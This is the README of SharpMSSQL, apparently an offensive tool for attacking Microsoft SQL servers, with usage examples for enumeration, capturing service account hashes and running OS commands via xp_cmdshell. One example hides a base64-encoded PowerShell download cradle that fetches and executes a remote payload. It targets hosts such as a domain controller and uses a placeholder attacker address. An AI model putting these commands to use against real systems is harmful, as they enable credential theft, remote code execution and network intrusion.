# SharpMSSQL
## Purpose
Just for enumeration and exploitation of some vulns
## Usage
```
.\SharpMSSQL.exe [hostname] [database] [operation] <options>
```
## Example for enum
```
.\SharpMSSQL.exe appsrv01 master enum
```

## Example for grab svc hash
```
.\SharpMSSQL.exe appsrv01 master gethash 192.168.45.195
```

## Example for execute command with xp_cmdshell
```
.\SharpMSSQL.exe appsrv01 master cmd whoami
.\SharpMSSQL.exe dc01 master cmd 'powershell.exe -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAxADMANwAuADIAMQAzADcALgAyADEAMwA3AC4AMgAxADMANwAvAHAAYQB5AGwAbwBhAGQALgB0AHgAdAAnACkA'
```


# Supported opertations
- enum
- gethash
- cmd